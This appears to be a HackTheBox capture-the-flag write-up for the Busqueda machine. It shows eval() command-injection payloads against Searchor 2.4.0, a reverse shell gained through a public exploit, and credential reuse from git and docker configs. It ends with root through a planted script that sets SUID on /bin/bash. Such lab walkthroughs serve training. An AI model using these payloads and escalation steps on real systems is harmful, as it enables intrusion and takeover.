---
title: "Busqueda Writeup - HackTheBox"
date: 2024-10-26
draft: false
Tags:
- HackTheBox
- Linux
- Easy
- NetSecFocus
- TJNull
---

| Link:      | https://app.hackthebox.com/machines/Busqueda |
| ---------- | -------------------------------------------- |
| Difficulty | Easy                                         |
| Machine    | Linux                                        |

---
# Enumeration
### Nmap Scan
```
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 (http)
I added `searcher.htb` in my `/etc/hosts` file and checked the site. This is what the site looks like:
![](assets/Pasted%20image%2020241026095230.png)

After looking a bit on the site doing enumeration like directory fuzzing. I noticed the site uses Flask and uses Searchor 2.4.0. Here Searchor 2.4.0 is vulnerable to command injection here.
### Explanation of the Vulnerability
In file **`src/sarchor/main.py`** of **`Searchor <= 2.4.2`** there is a function call **`eval()`**:
```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< HERE 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```

Which makes it vulnerable to command injection since it isn't sanitized, and we can use following payloads for command injection:
- `__import__('os').system('<CMD>')`
- `__import__('os').popen('<CMD>').read()`
- `etc`

### PoC & Exploit
I got a nice little exploit for this here: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

All I did was cloned the repo and ran the `exploit.sh` PoC Script they have gave to us.
I ran the following command and I had netcat listening on port 1337 as well. 
![](assets/Pasted%20image%2020241026100435.png)

After the script executes I see a reverse shell of user `svc` pops up in our listener and we also get our `user.txt` flag here.

![](assets/Pasted%20image%2020241026100554.png)

# Privilege Escalation to Root
I looked around the system and found two nice info. At `/home/svc` there is a folder `.gitconfig`:
```
svc@busqueda:~$ cat .gitconfig
cat .gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
```

It reveals that the user is `cody`. And checking the source code of the web app, I found following git config file:
![](assets/Pasted%20image%2020241026104949.png)

Here credentials is being supplied using url scheme to `gitea.searcher.htb`. I will add this into my `/etc/hosts` and then try to access it. And maybe use the credentials there to find something useful. 
And yeah `cody:jh1usoih2bkjaspwe92` worked. yay! I found nothing useful in the website though. 
I did a random `sudo -l` check with the credentials above since the user is cody, the password reuse must be done by the user cody in this case. And yeah! It worked.
```
svc@busqueda:/var/www/app/.git$ sudo -l -S
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

And we have a possible vector for root as well. But the fact that we can't read the source code to this file. We are restricted to execute permission here.

I tried the following test argument which lets us know the allowed argument.
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
<usr/bin/python3 /opt/scripts/system-checkup.py test
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Using `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps` lists two container running i.e gitea & mysql.

We can probably get some sort of credentials from mysql container? We can try using `docker-inspect`.
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
<thon3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

We need format & container name in order to inspect the docker. We know the container name but the format. I found this: https://docs.docker.com/engine/cli/formatting/
Which tells how the formatting works.

So I ran following (`jq .` is for json formatting learn more about jq [here](https://jqlang.github.io/jq/)):
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
```

I also found database password here:
```
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ]
```

Not sure how useful the db password might come but let's see.
I want the instance's ip address. For that I found this formatting in [site](https://docs.docker.com/reference/cli/docker/inspect/#examples): 
![](assets/Pasted%20image%2020241026110824.png)

I will modify it to my use case with the python script like this:
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
```

Which outputs the following:
```
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "bf915680ed570128582ba98f8f91606a9941f07c1b0bf344155b9bb360722475",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```

I know the ip, db username, db password so let's try to connect to the mysql database.
```bash
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```

I tried to extract all user info but it didn't fit properly in the terminal. 
![](assets/Pasted%20image%2020241026112027.png)

So I only tried to show interesting informations so I used the query `SELECT name, email, passwd FROM user;`  and it shows to user's password here. 
![](assets/Pasted%20image%2020241026112219.png)

I tried to crack the password but no success. After a while I reused the database password as administrator's password to see if the admin creds and db creds are same. 
And to my suprise `administrator:yuiu1hoiu4i5ho1uh` worked. And I am in.

There is a private repo in admin profile which is the scripts that we found in `/opt/scripts` file. Since we now have the source code scripts we may try to use it and abuse the script to get root.
![](assets/Pasted%20image%2020241026112517.png)

Since we are most interested in `system-checkup.py` since user svc can run it as root. 
Looking at it's source code and I found something interesting here. The script runs `./full-checkup.sh` when we supply argument `full-checkup`.
![](assets/Pasted%20image%2020241026112840.png)

If we run the `system-checkup.py` with argument `full-checkup` it prints `"Something went wrong"`. 
![](assets/Pasted%20image%2020241026113105.png)

You may ask why? It's because of the `try-except` being used. It tried to run `./full-checkup.sh` but since the file isn't present in the current directory we are running the script from. 

We can try to abuse the `system-checkup.py` script now by making our own `full-checkup.sh` script in `/tmp` and run the command from `/tmp` directory. In our-custom-made script of `full-checkup.sh` I will basically make the `/bin/bash` a suid executable binary so I can easily get root.

I made the following script and gave it execute permission.
```
svc@busqueda:/tmp$ cat full-checkup.sh 
#!/bin/bash

chmod u+s /bin/bash
```

Now I will run the following and we should have our bash binary as suid executable.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![](assets/Pasted%20image%2020241026114407.png)

We no more get the `"Something went wrong"` error which means our bash script ran. And we should have root now.
![](assets/Pasted%20image%2020241026114647.png)

# Conclusion
Thanks for reading my walkthrough. This box was nice. It was part of TJNull's "[NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)". 
